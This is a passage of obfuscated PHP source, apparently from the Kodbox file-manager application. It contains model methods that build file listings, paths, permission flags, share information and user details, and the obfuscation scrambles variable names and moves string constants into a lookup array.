$this->_listDataApply($ÔîİºÕí, $ª½ˆÅ‘“); return $ÔîİºÕí[0]; } protected function _listDataApply(&$ÔäÁİÈ®, $ÏŒÈùó™ = false) { $°Ö‹÷áİ =& $_SERVER[•€áå–Õ]; if (!$ÔäÁİÈ®) { $ÔäÁİÈ® = array(); return; } $ÖêÖéß‹ = array_to_keyvalue($ÔäÁİÈ®, $°Ö‹÷áİ[22], $°Ö‹÷áİ[193]); $ÖêÖéß‹ = array_unique($ÖêÖéß‹); $this->_listSourceCache($ÔäÁİÈ®); if (!$ÏŒÈùó™) { $this->_listAppendMeta($ÔäÁİÈ®, $ÖêÖéß‹); $this->_listAppendFileMeta($ÔäÁİÈ®, $ÖêÖéß‹); $this->_listAppendChildren($ÔäÁİÈ®, $ÖêÖéß‹); } $this->_listAppendPath($ÔäÁİÈ®); $this->_listAppendAuth($ÔäÁİÈ®); $this->_listAppendSourceInfo($ÔäÁİÈ®, $ÖêÖéß‹); $this->_listAppendUser($ÔäÁİÈ®); $this->_listFilterInfo($ÔäÁİÈ®, $ÏŒÈùó™); $this->_listAppendAuthSecret($ÔäÁİÈ®); } protected function _listSourceCache($ô£™–â) { $á·‰Õû± =& $_SERVER[•€áå–Õ]; foreach ($ô£™–â as $øŞª’±¬) { self::$cacheSourceInfo[$á·‰Õû±[512] . $øŞª’±¬[$á·‰Õû±[193]]] = $øŞª’±¬; } } protected function _listFilterInfo(&$¢¯êÕôÒ, $Û—¯öœ× = false) { $Íó¡Öù =& $_SERVER[•€áå–Õ]; foreach ($¢¯êÕôÒ as &$éÜ­’Èˆ) { $éÜ­’Èˆ = $this->pathInfoFilter($éÜ­’Èˆ); self::$cachePathInfo[$Íó¡Öù[513] . intval($Û—¯öœ×) . $Íó¡Öù[441] . $éÜ­’Èˆ[$Íó¡Öù[193]]] = $éÜ­’Èˆ; } unset($éÜ­’Èˆ); } protected function _listMake(&$ˆ«ò«³ü) { $ùˆñÄ¹Æ =& $_SERVER[•€áå–Õ]; $ˆ«ò«³ü[$ùˆñÄ¹Æ[94]] = array(); $ˆ«ò«³ü[$ùˆñÄ¹Æ[95]] = array(); foreach ($ˆ«ò«³ü[$ùˆñÄ¹Æ[424]] as $¼Œ§¤¢‘) { $ŞĞà¡é = $¼Œ§¤¢‘[$ùˆñÄ¹Æ[464]] == 1 ? $ùˆñÄ¹Æ[94] : $ùˆñÄ¹Æ[95]; $ˆ«ò«³ü[$ŞĞà¡é][] = $¼Œ§¤¢‘; } unset($ˆ«ò«³ü[$ùˆñÄ¹Æ[424]]); } protected function _listAppendMeta(&$°ÏİÁ‘©, $Í†¥¬æÇ) { $°¥ûÀã® =& $_SERVER[•€áå–Õ]; $æ‹ù¨ãø = array($°¥ûÀã®[470] => array($°¥ûÀã®[471], $Í†¥¬æÇ)); $¬ó®ÜÌ = Model($°¥ûÀã®[514])->field($°¥ûÀã®[515])->where($æ‹ù¨ãø)->select(); if (!$¬ó®ÜÌ) { return; } $¨£Üá›é = array($°¥ûÀã®[516], $°¥ûÀã®[517], $°¥ûÀã®[496]); $µ®ş‡ëÕ = array(); foreach ($¬ó®ÜÌ as $ ¾á©Ì) { if (!isset($µ®ş‡ëÕ[$ ¾á©Ì[$°¥ûÀã®[193]]])) { $µ®ş‡ëÕ[$ ¾á©Ì[$°¥ûÀã®[193]]] = array(); } if (in_array($ ¾á©Ì[$°¥ûÀã®[106]], $¨£Üá›é)) { continue; } $µ®ş‡ëÕ[$ ¾á©Ì[$°¥ûÀã®[193]]][$ ¾á©Ì[$°¥ûÀã®[106]]] = $ ¾á©Ì[$°¥ûÀã®[429]]; } foreach ($°ÏİÁ‘© as &$…ãâÓ‘ä) { $…ãâÓ‘ä[$°¥ûÀã®[518]] = !1; if (isset($µ®ş‡ëÕ[$…ãâÓ‘ä[$°¥ûÀã®[193]]])) { $…ãâÓ‘ä[$°¥ûÀã®[518]] = $µ®ş‡ëÕ[$…ãâÓ‘ä[$°¥ûÀã®[193]]]; } if ($this->fileIsLock($…ãâÓ‘ä) && $…ãâÓ‘ä[$°¥ûÀã®[466]]) { $­ïğüØ¸ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $…ãâÓ‘ä[$°¥ûÀã®[466]][$°¥ûÀã®[467]] = AuthModel::authDisable($…ãâÓ‘ä[$°¥ûÀã®[466]][$°¥ûÀã®[467]], $­ïğüØ¸); $…ãâÓ‘ä[$°¥ûÀã®[466]][$°¥ûÀã®[519]][$°¥ûÀã®[466]] = $…ãâÓ‘ä[$°¥ûÀã®[466]][$°¥ûÀã®[467]]; } } unset($…ãâÓ‘ä); } protected function _listAppendFileMeta(&$È­Éñ¶’, $”ÌÌŠ£¢) { $øß‰ï£¼ =& $_SERVER[•€áå–Õ]; $øÎ£°º¨ = array_to_keyvalue($È­Éñ¶’, $øß‰ï£¼[22], $øß‰ï£¼[520]); $øÎ£°º¨ = array_filter(array_unique($øÎ£°º¨)); if (!$øÎ£°º¨) { return; } $ÛË²ªƒ = array($øß‰ï£¼[521] => array($øß‰ï£¼[471], $øÎ£°º¨)); $é…«şØ† = $øß‰ï£¼[522]; $‡çÎçË = Model($øß‰ï£¼[523])->field($é…«şØ†)->where($ÛË²ªƒ)->select(); $‡çÎçË = array_to_keyvalue($‡çÎçË, $øß‰ï£¼[520]); $ôÎÇÁà„ = Model($øß‰ï£¼[524])->field($øß‰ï£¼[525])->where($ÛË²ªƒ)->select(); $ôÎÇÁà„ = $ôÎÇÁà„ ? $ôÎÇÁà„ : array(); $ÉİÍ–ç = array(); foreach ($ôÎÇÁà„ as $ÕÃµé–â) { if (!isset($ÉİÍ–ç[$ÕÃµé–â[$øß‰ï£¼[520]]])) { $ÉİÍ–ç[$ÕÃµé–â[$øß‰ï£¼[520]]] = array(); } $ÉİÍ–ç[$ÕÃµé–â[$øß‰ï£¼[520]]][$ÕÃµé–â[$øß‰ï£¼[106]]] = $ÕÃµé–â[$øß‰ï£¼[429]]; } foreach ($È­Éñ¶’ as &$ÂÅÙ·â) { $ÂÅßŠğ» = $ÂÅÙ·â[$øß‰ï£¼[520]]; if (!$ÂÅßŠğ» || !is_array($‡çÎçË[$ÂÅßŠğ»])) { continue; } $ì«©©µ = $‡çÎçË[$ÂÅßŠğ»]; $ì«©©µ[$øß‰ï£¼[88]] = $ÂÅÙ·â[$øß‰ï£¼[88]]; $ì«©©µ[$øß‰ï£¼[42]] = $ÂÅÙ·â[$øß‰ï£¼[42]]; if (!$ì«©©µ[$øß‰ï£¼[526]]) { Model($øß‰ï£¼[523])->fileMd5Check($ì«©©µ); } if (!isset(self::$cacheFileInfo[$øß‰ï£¼[527] . $ÂÅßŠğ»])) { self::$cacheFileInfo[$øß‰ï£¼[527] . $ÂÅßŠğ»] = array_merge(array(), $ì«©©µ); } unset($‡çÎçË[$ÂÅßŠğ»][$øß‰ï£¼[96]]); $ÜÚ±öŞ« = is_array($ÉİÍ–ç[$ÂÅßŠğ»]) ? $ÉİÍ–ç[$ÂÅßŠğ»] : array(); $ÂÅÙ·â[$øß‰ï£¼[528]] = array_merge($ÜÚ±öŞ«, $‡çÎçË[$ÂÅßŠğ»]); if (isset($ÂÅÙ·â[$øß‰ï£¼[528]][$øß‰ï£¼[183]])) { $ÂÅÙ·â[$øß‰ï£¼[183]] = json_decode($ÂÅÙ·â[$øß‰ï£¼[528]][$øß‰ï£¼[183]], !0); unset($ÂÅÙ·â[$øß‰ï£¼[528]][$øß‰ï£¼[183]]); } } unset($ÂÅÙ·â); } protected function _listAppendSourceInfo(&$’…Ø²¡, $éŒœ¢ç…) { $„é­ù–Ş =& $_SERVER[•€áå–Õ]; $‚…—¡ = Model($„é­ù–Ş[529])->listData(); $ï‹£ßŒ = Model($„é­ù–Ş[478])->listData(); $–ıİ° = Model($„é­ù–Ş[468])->listData(); $ª€ëİóÌ = Model($„é­ù–Ş[530])->listSimple(); $ÉÑ¡Öß = array_to_keyvalue($‚…—¡, $„é­ù–Ş[454]); $Ÿ¼Ç¾½” = array_to_keyvalue_group($ï‹£ßŒ, $„é­ù–Ş[96], $„é­ù–Ş[479]); $Ù°áÊ‹Ç = array_to_keyvalue($–ıİ°, $„é­ù–Ş[96]); $²íİ¿° = array_to_keyvalue_group($ª€ëİóÌ, $„é­ù–Ş[193]); foreach ($’…Ø²¡ as &$÷¼Òô–) { $÷¼Òô–[$„é­ù–Ş[99]] = array($„é­ù–Ş[531] => 0, $„é­ù–Ş[532] => 0, $„é­ù–Ş[533] => 0); if (isset($Ù°áÊ‹Ç[$÷¼Òô–[$„é­ù–Ş[193]]])) { $÷¼Òô–[$„é­ù–Ş[99]][$„é­ù–Ş[534]] = 1; $÷¼Òô–[$„é­ù–Ş[99]][$„é­ù–Ş[535]] = $Ù°áÊ‹Ç[$÷¼Òô–[$„é­ù–Ş[193]]][$„é­ù–Ş[42]]; } if ($Ÿ¼Ç¾½” && $ÉÑ¡Öß && isset($Ÿ¼Ç¾½”[$÷¼Òô–[$„é­ù–Ş[193]]])) { $÷¼Òô–[$„é­ù–Ş[99]][$„é­ù–Ş[536]] = array(); foreach ($Ÿ¼Ç¾½”[$÷¼Òô–[$„é­ù–Ş[193]]] as $¨ÃÀşßğ) { $œè¯ßÂÎ = $ÉÑ¡Öß[$¨ÃÀşßğ]; $÷¼Òô–[$„é­ù–Ş[99]][$„é­ù–Ş[536]][] = array($„é­ù–Ş[537] => $œè¯ßÂÎ[$„é­ù–Ş[454]], $„é­ù–Ş[473] => $œè¯ßÂÎ[$„é­ù–Ş[42]], $„é­ù–Ş[538] => $œè¯ßÂÎ[$„é­ù–Ş[539]]); } } if ($²íİ¿° && isset($²íİ¿°[$÷¼Òô–[$„é­ù–Ş[193]]])) { $÷¼Òô–[$„é­ù–Ş[99]][$„é­ù–Ş[540]] = array(); foreach ($²íİ¿°[$÷¼Òô–[$„é­ù–Ş[193]]] as $ÚìÚ¾¨Â) { $Úî®™Êî = $„é­ù–Ş[541]; if ($ÚìÚ¾¨Â[$„é­ù–Ş[542]] == $„é­ù–Ş[100]) { $Úî®™Êî .= $„é­ù–Ş[543]; } $÷¼Òô–[$„é­ù–Ş[99]][$„é­ù–Ş[540]] = array_field_key($ÚìÚ¾¨Â, explode($„é­ù–Ş[60], $Úî®™Êî)); } } } unset($÷¼Òô–); return $’…Ø²¡; } protected function _listAppendChildren(&$ä¸Ìë¨ô, $¡ÈµˆÔµ) { $ìÎü¬‡¨ =& $_SERVER[•€áå–Õ]; $¶¬ê”ãé = array(); $½­¤™³ = array($ìÎü¬‡¨[235] => 0, $ìÎü¬‡¨[236] => 0); foreach ($ä¸Ìë¨ô as &$§›«È´å) { if (!$§›«È´å[$ìÎü¬‡¨[464]]) { continue; } $¶¬ê”ãé[] = $§›«È´å[$ìÎü¬‡¨[193]]; } unset($§›«È´å); if (!$¶¬ê”ãé) { return; } $¥ÌÁÃÈğ = array($ìÎü¬‡¨[192] => array($ìÎü¬‡¨[17], $¶¬ê”ãé), $ìÎü¬‡¨[484] => 0); $×Ç¢­Ç = array($ìÎü¬‡¨[192], $ìÎü¬‡¨[464], $ìÎü¬‡¨[544] => $ìÎü¬‡¨[545]); $Ìë›öúà = $this->field($×Ç¢­Ç)->where($¥ÌÁÃÈğ)->group($ìÎü¬‡¨[546])->select(); $ùâëÉ±å = array(); foreach ($Ìë›öúà as $…êª Ã) { $¸Ñ³À = $…êª Ã[$ìÎü¬‡¨[192]]; $ÕòóÙºæ = $…êª Ã[$ìÎü¬‡¨[464]] == $ìÎü¬‡¨[100] ? $ìÎü¬‡¨[236] : $ìÎü¬‡¨[235]; if (!isset($ùâëÉ±å[$¸Ñ³À])) { $ùâëÉ±å[$¸Ñ³À] = array($ìÎü¬‡¨[235] => 0, $ìÎü¬‡¨[236] => 0); } $ùâëÉ±å[$¸Ñ³À][$ÕòóÙºæ] += $…êª Ã[$ìÎü¬‡¨[545]]; } foreach ($ä¸Ìë¨ô as &$§›«È´å) { if (!$§›«È´å[$ìÎü¬‡¨[464]]) { continue; } $­œöîôÇ = is_array($ùâëÉ±å[$§›«È´å[$ìÎü¬‡¨[193]]]) ? $ùâëÉ±å[$§›«È´å[$ìÎü¬‡¨[193]]] : $½­¤™³; $§›«È´å[$ìÎü¬‡¨[236]] = $­œöîôÇ[$ìÎü¬‡¨[236]]; $§›«È´å[$ìÎü¬‡¨[235]] = $­œöîôÇ[$ìÎü¬‡¨[235]]; unset($§›«È´å[$ìÎü¬‡¨[465]]); } unset($§›«È´å); } protected function _listAppendAuth(&$­á©¨í) { $ªü…Œï =& $_SERVER[•€áå–Õ]; $Û£îÅºÙ = array(); foreach ($­á©¨í as $àâôû‹Ã) { if ($àâôû‹Ã[$ªü…Œï[190]] == self::TYPE_GROUP) { $Û£îÅºÙ[] = $àâôû‹Ã[$ªü…Œï[193]]; } } if (!$Û£îÅºÙ) { return; } $ëÏµ¢†Ô = array_to_keyvalue($­á©¨í, $ªü…Œï[193]); $ôı”‘ñ’ = Model($ªü…Œï[547])->getSourceList($Û£îÅºÙ, $ëÏµ¢†Ô); $Œİøüòè = KodUser::isRoot(); foreach ($­á©¨í as $ÇÌ†Æ => &$àâôû‹Ã) { $àâôû‹Ã[$ªü…Œï[466]] = $ôı”‘ñ’[$àâôû‹Ã[$ªü…Œï[193]]]; if (!$àâôû‹Ã[$ªü…Œï[466]] && $àâôû‹Ã[$ªü…Œï[190]] == self::TYPE_GROUP) { $àâôû‹Ã[$ªü…Œï[466]] = Action($ªü…Œï[548])->pathGroupAuthMake($àâôû‹Ã[$ªü…Œï[549]]); if (!$àâôû‹Ã[$ªü…Œï[466]] && !$Œİøüòè) { $àâôû‹Ã[$ªü…Œï[229]] = !1; $àâôû‹Ã[$ªü…Œï[228]] = !1; } } if ($àâôû‹Ã[$ªü…Œï[466]]) { $àâôû‹Ã[$ªü…Œï[229]] = AuthModel::authCheckEdit($àâôû‹Ã[$ªü…Œï[466]][$ªü…Œï[467]]); $àâôû‹Ã[$ªü…Œï[228]] = AuthModel::authCheckView($àâôû‹Ã[$ªü…Œï[466]][$ªü…Œï[467]]); } $this->groupPathDisplay($àâôû‹Ã); } unset($àâôû‹Ã); } public function _listAppendAuthSecret(&$ÉÒ•ÏØò) { $®Ô¶•ñı =& $_SERVER[•€áå–Õ]; if (Model($®Ô¶•ñı[487])->get($®Ô¶•ñı[550]) != $®Ô¶•ñı[100]) { return; } static $ªÕäªÉ‹ = false; if (!$ªÕäªÉ‹) { $ÙãÔæÇÎ = Model($®Ô¶•ñı[551]); $Ÿ€ÁÎÙ¸ = Model($®Ô¶•ñı[552]); $ªÕäªÉ‹ = $Ÿ€ÁÎÙ¸->listData(); $ªÕäªÉ‹ = array_to_keyvalue($ªÕäªÉ‹, $®Ô¶•ñı[193]); $‘Ü³Âş‰ = json_decode(Model($®Ô¶•ñı[487])->get($®Ô¶•ñı[553]), !0); $‘Ü³Âş‰ = array_to_keyvalue($‘Ü³Âş‰, $®Ô¶•ñı[454]); foreach ($ªÕäªÉ‹ as $¦ËÙ»Ş => $ÄË·±Û¸) { $„Ã‚øŞ = $‘Ü³Âş‰[$ÄË·±Û¸[$®Ô¶•ñı[554]]]; if (!$„Ã‚øŞ) { $Ÿ€ÁÎÙ¸->remove($ÄË·±Û¸[$®Ô¶•ñı[454]]); unset($ªÕäªÉ‹[$¦ËÙ»Ş]); continue; } $ß‰ôÆï = $ÙãÔæÇÎ->listData($„Ã‚øŞ[$®Ô¶•ñı[466]]); if (!$ß‰ôÆï) { $Ÿ€ÁÎÙ¸->remove($ÄË·±Û¸[$®Ô¶•ñı[454]]); unset($ªÕäªÉ‹[$¦ËÙ»Ş]); continue; } $ÄË·±Û¸[$®Ô¶•ñı[466]] = $ß‰ôÆï; $ÄË·±Û¸[$®Ô¶•ñı[555]] = $„Ã‚øŞ; $ÄË·±Û¸[$®Ô¶•ñı[556]] = Model($®Ô¶•ñı[557])->getInfoSimpleOuter($ÄË·±Û¸[$®Ô¶•ñı[506]]); $ªÕäªÉ‹[$¦ËÙ»Ş] = $ÄË·±Û¸; } } $Ş›Ù· = USER_ID; $ø·™“ŒÅ = array(); $’±˜ŞÄä = $this->_listAppendPath($ø·™“ŒÅ, !0); foreach ($ÉÒ•ÏØò as $¦ËÙ»Ş => &$ÄË·±Û¸) { if (!is_array($ÄË·±Û¸[$®Ô¶•ñı[466]])) { continue; } if ($ÄË·±Û¸[$®Ô¶•ñı[190]] != $®Ô¶•ñı[558]) { continue; } if (isset($ªÕäªÉ‹[$ÄË·±Û¸[$®Ô¶•ñı[193]]])) { $¤ÕÑÆÅº = $ªÕäªÉ‹[$ÄË·±Û¸[$®Ô¶•ñı[193]]]; if (!is_array($ÄË·±Û¸[$®Ô¶•ñı[518]])) { $ÄË·±Û¸[$®Ô¶•ñı[518]] = array(); } $ÄË·±Û¸[$®Ô¶•ñı[518]][$®Ô¶•ñı[559]] = $¤ÕÑÆÅº[$®Ô¶•ñı[554]]; $ÄË·±Û¸[$®Ô¶•ñı[466]][$®Ô¶•ñı[560]] = $¤ÕÑÆÅº; $ÄË·±Û¸[$®Ô¶•ñı[466]][$®Ô¶•ñı[561]] = $ÄË·±Û¸[$®Ô¶•ñı[562]]; $ÄË·±Û¸[$®Ô¶•ñı[466]][$®Ô¶•ñı[563]] = $®Ô¶•ñı[100]; if ($¤ÕÑÆÅº[$®Ô¶•ñı[506]] != $Ş›Ù·) { $ÄË·±Û¸[$®Ô¶•ñı[466]][$®Ô¶•ñı[467]] = $ÄË·±Û¸[$®Ô¶•ñı[466]][$®Ô¶•ñı[467]] & $¤ÕÑÆÅº[$®Ô¶•ñı[466]][$®Ô¶•ñı[466]]; } continue; } $ùó”Ş¿× = $this->parentLevelArray($ÄË·±Û¸[$®Ô¶•ñı[564]]); $î¾Ï‘‚€ = array_reverse($ùó”Ş¿×); foreach ($î¾Ï‘‚€ as $âåó±¹í => $†á¸ƒŠ) { if (!isset($ªÕäªÉ‹[$†á¸ƒŠ])) { continue; } $¤ÕÑÆÅº = $ªÕäªÉ‹[$†á¸ƒŠ]; $ÄË·±Û¸[$®Ô¶•ñı[466]][$®Ô¶•ñı[560]] = $¤ÕÑÆÅº; if ($¤ÕÑÆÅº[$®Ô¶•ñı[506]] != $Ş›Ù·) { $ÄË·±Û¸[$®Ô¶•ñı[466]][$®Ô¶•ñı[467]] = $ÄË·±Û¸[$®Ô¶•ñı[466]][$®Ô¶•ñı[467]] & $¤ÕÑÆÅº[$®Ô¶•ñı[466]][$®Ô¶•ñı[466]]; } $…ç±‚†“ = $®Ô¶•ñı[22]; $¨¢¯»‰‹ = count($ùó”Ş¿×) - $âåó±¹í; for ($°Ç™ÚŒ = 0; $°Ç™ÚŒ < $¨¢¯»‰‹; $°Ç™ÚŒ++) { if (!isset($’±˜ŞÄä[$ùó”Ş¿×[$°Ç™ÚŒ]])) { $…ç±‚†“ = $®Ô¶•ñı[22]; break; } $…ç±‚†“ = $…ç±‚†“ . rtrim($’±˜ŞÄä[$ùó”Ş¿×[$°Ç™ÚŒ]], $®Ô¶•ñı[18]) . $®Ô¶•ñı[18]; } $ÄË·±Û¸[$®Ô¶•ñı[466]][$®Ô¶•ñı[561]] = rtrim($…ç±‚†“, $®Ô¶•ñı[18]) . $®Ô¶•ñı[18]; break; } } unset($ÄË·±Û¸); } public function groupPathDisplay(&$¥©Ë£Ã) { $äÈäÙ¡Ú =& $_SERVER[•€áå–Õ]; if ($¥©Ë£Ã[$äÈäÙ¡Ú[190]] != self::TYPE_GROUP) { return; } $¼êº‚šà = Model($äÈäÙ¡Ú[565])->getInfo($¥©Ë£Ã[$äÈäÙ¡Ú[549]]); $¸’óĞˆ = $this->parentLevelArray($¼êº‚šà[$äÈäÙ¡Ú[564]]); $™¶¨µÄ = $äÈäÙ¡Ú[22]; foreach ($¸’óĞˆ as $ğÌ±‘®¨) { $“øÆœÉ = Model($äÈäÙ¡Ú[565])->getInfo($ğÌ±‘®¨); $™¶¨µÄ .= $“øÆœÉ[$äÈäÙ¡Ú[99]][$äÈäÙ¡Ú[193]] . $äÈäÙ¡Ú[60]; } $¥©Ë£Ã[$äÈäÙ¡Ú[566]] = $¼êº‚šà[$äÈäÙ¡Ú[192]]; $¥©Ë£Ã[$äÈäÙ¡Ú[567]] = $¼êº‚šà[$äÈäÙ¡Ú[564]]; $¥©Ë£Ã[$äÈäÙ¡Ú[568]] = $¼êº‚šà[$äÈäÙ¡Ú[569]]; $¥©Ë£Ã[$äÈäÙ¡Ú[570]] = $™¶¨µÄ . $¼êº‚šà[$äÈäÙ¡Ú[99]][$äÈäÙ¡Ú[193]]; } protected function _listAppendPath(&$ˆå°•, $”ßÃš÷  = false) { $ó ŞŸ‹â =& $_SERVER[•€áå–Õ]; static $¡„âëê = array(); $³ »“äÄ = array(); $‘ã’æ¢Œ = array(); if ($”ßÃš÷ ) { return $¡„âëê; } foreach ($ˆå°• as &$ûÛÀÏĞ) { $€ „Å¢¤ = $ûÛÀÏĞ[$ó ŞŸ‹â[193]]; if ($ûÛÀÏĞ[$ó ŞŸ‹â[464]] == $ó ŞŸ‹â[100] && $ûÛÀÏĞ[$ó ŞŸ‹â[192]] != 0) { $¡„âëê[$€ „Å¢¤] = $ûÛÀÏĞ[$ó ŞŸ‹â[42]]; } if ($ûÛÀÏĞ[$ó ŞŸ‹â[464]] == $ó ŞŸ‹â[100] && $ûÛÀÏĞ[$ó ŞŸ‹â[192]] == 0) { $¡„âëê[$€ „Å¢¤] = $this->_listAppendPathRoot($ûÛÀÏĞ, array()); } if (isset($‘ã’æ¢Œ[$ûÛÀÏĞ[$ó ŞŸ‹â[564]]])) { continue; } $‘ã’æ¢Œ[$ûÛÀÏĞ[$ó ŞŸ‹â[564]]] = !0; $ôÑçİÓâ = $this->parentLevelArray($ûÛÀÏĞ[$ó ŞŸ‹â[564]]); foreach ($ôÑçİÓâ as $ÚÔØ˜È => $éò¹Á›Ó) { if (isset($¡„âëê[$éò¹Á›Ó])) { continue; } if ($ÚÔØ˜È == 0) { $¡„âëê[$éò¹Á›Ó] = $this->_listAppendPathRoot($ûÛÀÏĞ, $ôÑçİÓâ); } if ($ÚÔØ˜È != 0) { $³ »“äÄ[] = $éò¹Á›Ó; } } } unset($ûÛÀÏĞ); $³ »“äÄ = array_unique($³ »“äÄ); if (count($³ »“äÄ) > 0) { $‡ Šİƒ = array($ó ŞŸ‹â[470] => array($ó ŞŸ‹â[471], $³ »“äÄ)); if (count($³ »“äÄ) == 1) { $…şî“–ì = $this->sourceInfo($³ »“äÄ[0]); $ Á÷¼”† = is_array($…şî“–ì) ? array($…şî“–ì) : !1; } else { $ Á÷¼”† = $this->field($ó ŞŸ‹â[571])->where($‡ Šİƒ)->select(); } if (!$ Á÷¼”†) { $ Á÷¼”† = array(); } foreach ($ Á÷¼”† as $Ç—Ô’) { $¡„âëê[$Ç—Ô’[$ó ŞŸ‹â[193]]] = $Ç—Ô’[$ó ŞŸ‹â[42]]; } } $áÉ…Ù›Ò = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $÷ŒøØˆ‘ = array(); foreach ($ˆå°• as &$ûÛÀÏĞ) { $”ÇÄêÛ² = $ûÛÀÏĞ[$ó ŞŸ‹â[564]]; $ô‘»Àøª = $ó ŞŸ‹â[22]; if (isset($÷ŒøØˆ‘[$”ÇÄêÛ²])) { $ô‘»Àøª = $÷ŒøØˆ‘[$”ÇÄêÛ²]; } else { $ôÑçİÓâ = $this->parentLevelArray($ûÛÀÏĞ[$ó ŞŸ‹â[564]]); foreach ($ôÑçİÓâ as $ÚÔØ˜È => $éò¹Á›Ó) { if (isset($¡„âëê[$éò¹Á›Ó])) { $ô‘»Àøª .= $¡„âëê[$éò¹Á›Ó] . $ó ŞŸ‹â[18]; } } $÷ŒøØˆ‘[$”ÇÄêÛ²] = $ô‘»Àøª; } $ô‘»Àøª .= $ûÛÀÏĞ[$ó ŞŸ‹â[42]]; if ($ûÛÀÏĞ[$ó ŞŸ‹â[464]] == $ó ŞŸ‹â[100]) { $ô‘»Àøª .= $ó ŞŸ‹â[18]; } $ûÛÀÏĞ[$ó ŞŸ‹â[562]] = str_replace($ó ŞŸ‹â[572], $ó ŞŸ‹â[18], $ô‘»Àøª); if ($ûÛÀÏĞ[$ó ŞŸ‹â[192]] == $ó ŞŸ‹â[224]) { $ûÛÀÏĞ[$ó ŞŸ‹â[42]] = trim($¡„âëê[$ûÛÀÏĞ[$ó ŞŸ‹â[193]]], $ó ŞŸ‹â[18]); $ûÛÀÏĞ[$ó ŞŸ‹â[562]] = $ûÛÀÏĞ[$ó ŞŸ‹â[42]] . $ó ŞŸ‹â[18]; } if (intval($ûÛÀÏĞ[$ó ŞŸ‹â[190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ûÛÀÏĞ, $ôÑçİÓâ, $áÉ…Ù›Ò); } } unset($ûÛÀÏĞ); return $ˆå°•; } private function _listAppendPathRecycle(&$ÖáÜÎ¨, $®ùß­€¬, $Éë‰Êı) { $æ¯¼­‚¬ =& $_SERVER[•€áå–Õ]; if (!in_array($Éë‰Êı, $®ùß­€¬) && $ÖáÜÎ¨[$æ¯¼­‚¬[193]] != $Éë‰Êı) { return; } $•½àáëæ = explode($æ¯¼­‚¬[18], trim($ÖáÜÎ¨[$æ¯¼­‚¬[562]], $æ¯¼­‚¬[18])); $Š•œ‰•° = implode($æ¯¼­‚¬[18], array_slice($•½àáëæ, 2)); $ÖáÜÎ¨[$æ¯¼­‚¬[562]] = $æ¯¼­‚¬[18] . LNG($æ¯¼­‚¬[573]) . $æ¯¼­‚¬[18] . ltrim($Š•œ‰•°, $æ¯¼­‚¬[18]); $ÖáÜÎ¨[$æ¯¼­‚¬[564]] = $æ¯¼­‚¬[574] . implode($æ¯¼­‚¬[60], array_slice($®ùß­€¬, 1)) . $æ¯¼­‚¬[60]; if ($ÖáÜÎ¨[$æ¯¼­‚¬[193]] == $Éë‰Êı) { $ÖáÜÎ¨[$æ¯¼­‚¬[564]] = $æ¯¼­‚¬[574]; $ÖáÜÎ¨[$æ¯¼­‚¬[192]] = $æ¯¼­‚¬[224]; $ÖáÜÎ¨[$æ¯¼­‚¬[42]] = LNG($æ¯¼­‚¬[573]); } $ÖáÜÎ¨[$æ¯¼­‚¬[575]] = $æ¯¼­‚¬[576]; } protected function _listAppendPathRoot(&$ôÑãÌäù, $şö…©•½) { $ù½ä‰¯Á =& $_SERVER[•€áå–Õ]; static $ºß×èà = false; $Ìäº„¦¥ = $ù½ä‰¯Á[22]; if ($ôÑãÌäù[$ù½ä‰¯Á[190]] == self::TYPE_USER) { if ($ôÑãÌäù[$ù½ä‰¯Á[549]] == USER_ID) { $Ìäº„¦¥ = LNG($ù½ä‰¯Á[577]); if ($ºß×èà === !1) { $¬ƒÈã†Ó = Model($ù½ä‰¯Á[578])->getInfoFull(USER_ID); $ºß×èà = _get($¬ƒÈã†Ó, $ù½ä‰¯Á[579], $ù½ä‰¯Á[22]); } if ($şö…©•½ && $şö…©•½[0] == $ºß×èà || !$şö…©•½ && $ôÑãÌäù[$ù½ä‰¯Á[193]] == $ºß×èà) { $Ìäº„¦¥ = LNG($ù½ä‰¯Á[580]); $ôÑãÌäù[$ù½ä‰¯Á[581]] = $ù½ä‰¯Á[582]; } if (!$şö…©•½) { $ôÑãÌäù[$ù½ä‰¯Á[42]] = $Ìäº„¦¥; } } else { $ôÑãÌäù[$ù½ä‰¯Á[583]] = Model($ù½ä‰¯Á[557])->getInfoSimpleOuter($ôÑãÌäù[$ù½ä‰¯Á[549]]); $Ìäº„¦¥ = LNG($ù½ä‰¯Á[584]) . $ù½ä‰¯Á[175] . $ôÑãÌäù[$ù½ä‰¯Á[583]][$ù½ä‰¯Á[42]] . $ù½ä‰¯Á[177]; } } else { if ($ôÑãÌäù[$ù½ä‰¯Á[190]] == self::TYPE_GROUP) { $íÂ¬à ¼ = Model($ù½ä‰¯Á[565])->getInfoSimple($ôÑãÌäù[$ù½ä‰¯Á[549]]); $Ìäº„¦¥ = $íÂ¬à ¼[$ù½ä‰¯Á[42]]; } else { if ($ôÑãÌäù[$ù½ä‰¯Á[190]] == self::TYPE_SYSTEM) { $Ìäº„¦¥ = $ù½ä‰¯Á[585]; } } } $Ìäº„¦¥ = $Ìäº„¦¥ ? $ù½ä‰¯Á[18] . $Ìäº„¦¥ . $ù½ä‰¯Á[18] : $ù½ä‰¯Á[18]; return $Ìäº„¦¥; } protected function _listAppendUser(&$ÅÓşáö) { $ïí×ïƒè =& $_SERVER[•€áå–Õ]; $›«Ÿ®Æ’ = array_to_keyvalue($ÅÓşáö, $ïí×ïƒè[22], $ïí×ïƒè[506]); $µêŸ¬§ = array_to_keyvalue($ÅÓşáö, $ïí×ïƒè[22], $ïí×ïƒè[508]); $¯ÕËİ = array_merge($›«Ÿ®Æ’, $µêŸ¬§); $øàÌ²Õ§ = Model($ïí×ïƒè[578])->userListInfo($¯ÕËİ); foreach ($ÅÓşáö as &$¯¨â°ùÔ) { $çù™Ö„Ù = $¯¨â°ùÔ[$ïí×ïƒè[506]]; $¯¨â°ùÔ[$ïí×ïƒè[506]] = $øàÌ²Õ§[$çù™Ö„Ù] ? $øàÌ²Õ§[$çù™Ö„Ù] : !1; $çù™Ö„Ù = $¯¨â°ùÔ[$ïí×ïƒè[508]]; $¯¨â°ùÔ[$ïí×ïƒè[508]] = $øàÌ²Õ§[$çù™Ö„Ù] ? $øàÌ²Õ§[$çù™Ö„Ù] : !1; if (isset($¯¨â°ùÔ[$ïí×ïƒè[518]]) && $¯¨â°ùÔ[$ïí×ïƒè[518]][$ïí×ïƒè[586]]) { $˜øªÅÊœ = 